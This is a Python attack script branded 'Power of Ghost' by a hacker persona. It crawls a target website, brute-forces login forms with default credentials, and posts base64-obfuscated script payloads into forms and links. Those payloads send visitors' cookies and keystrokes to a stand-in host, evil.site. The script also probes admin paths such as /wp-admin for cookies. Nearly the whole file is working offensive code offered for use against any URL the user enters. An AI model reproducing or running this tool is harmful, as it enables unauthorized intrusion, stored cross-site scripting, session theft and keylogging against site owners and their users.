#!/usr/bin/env python3
import requests, urllib.parse, random, warnings, sys, os
from bs4 import BeautifulSoup
import base64
from colorama import init, Fore

init(autoreset=True)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

session = requests.Session()
session.headers.update({
    "User-Agent": random.choice([
        "Mozilla/5.0 (Linux; Android 12; Mobile)",
        "Mozilla/5.0 (Linux; Android 11; Pixel)",
        "curl/7.68.0 (Android)",
    ])
})

### ████  BANNER  ████ ###
def banner():
    print(Fore.RED + """
    ╔══════════════════════════════════════════════╗
    ║              Power of Ghost v1.0             ║
    ║         [Sigma_Cyber_Ghost // Termux]        ║
    ║    Extreme Web-Stealer Everything of Taregt! ║
    ║ YT:@sigma_ghost_hacking IG:@safderkhan0800_  ║
    ╚══════════════════════════════════════════════╝
    """)

### ████  PAYLOADS ████ ###
def encode(js): return base64.b64encode(js.encode()).decode()

def extreme_payloads():
    return (
        f"<script>eval(atob('{encode('fetch(\"http://evil.site/cookie?data=\"+document.cookie)')}'));</script>" +
        f"<script>eval(atob('{encode('document.onkeydown=function(e){fetch(\"http://evil.site/key?c=\"+e.key)}')}'));</script>" +
        f"<iframe src='http://evil.site/ad.html' style='display:none'></iframe>"
    )

### ████  FORM ATTACK ████ ###
def attack_form(form, url):
    action = form.get("action", "")
    method = form.get("method", "GET").upper()
    target = urllib.parse.urljoin(url, action)
    fields = [i.get("name") for i in form.find_all("input") if i.get("name")]

    u_field = next((f for f in fields if "user" in f.lower() or "email" in f.lower()), None)
    p_field = next((f for f in fields if "pass" in f.lower() or "pwd" in f.lower()), None)

    if not u_field or not p_field:
        session.post(url, data={"x": extreme_payloads()}, verify=False)
        print(Fore.YELLOW + f"[!] Malware planted in {url}")
        return

    for user, pwd in [("admin", "admin123"), ("root", "toor"), ("test", "123456")]:
        try:
            resp = session.post(target, data={u_field: user, p_field: pwd}, timeout=7, verify=False)
            if "invalid" not in resp.text.lower():
                session.post(target, data={u_field: extreme_payloads()}, verify=False)
                print(Fore.GREEN + f"[+] LOGIN SUCCESS: {user}/{pwd} on {target}")
                return
        except Exception as e:
            print(Fore.RED + f"[-] Error @ {target}: {e}")

    print(Fore.RED + f"[-] Bruteforce failed on {target}")

### ████  SPIDER ████ ###
def spider(url, depth=3, visited=None):
    if visited is None: visited = set()
    if url in visited or depth == 0: return
    visited.add(url)

    try:
        resp = session.get(url, timeout=7, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        print(Fore.CYAN + f"[~] Crawled {url}")
    except:
        print(Fore.RED + f"[-] Failed to load {url}")
        return

    for form in soup.find_all("form"):
        attack_form(form, url)

    for link in soup.find_all("a", href=True):
        absolute = urllib.parse.urljoin(url, link.get("href"))
        if absolute.startswith("http") and absolute not in visited:
            try:
                session.post(absolute, data={"malicious": extreme_payloads()}, verify=False)
                print(Fore.MAGENTA + f"[+] Injected into {absolute}")
            except:
                print(Fore.RED + f"[-] Injection failed on {absolute}")
            spider(absolute, depth-1, visited)

### ████  ADMIN COOKIE + SESSION THEFT ████ ###
def steal_admin(url):
    for path in ["/admin", "/dashboard", "/wp-admin", "/cpanel"]:
        full = urllib.parse.urljoin(url, path)
        try:
            resp = session.get(full, verify=False, timeout=7)
            cookies = resp.cookies.get_dict()
            if cookies:
                print(Fore.GREEN + f"[+] Admin cookies at {full}: {cookies}")
            if "session" in resp.text.lower() or "auth" in resp.text.lower():
                print(Fore.YELLOW + f"[+] Session leak @ {full}")
        except:
            print(Fore.RED + f"[-] Admin scan failed: {full}")

### ████  EXECUTE ████ ###
def execute(target):
    banner()
    print(Fore.CYAN + "\n⚙️  Starting Extreme Attack...")
    spider(target)
    steal_admin(target)
    print(Fore.GREEN + "\n✅ Attack Completed.")

### ████  MAIN ████ ###
if __name__ == "__main__":
    try:
        target = input(Fore.CYAN + "\n[*] Target URL: ").strip()
        execute(target)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted.")
        sys.exit(0)
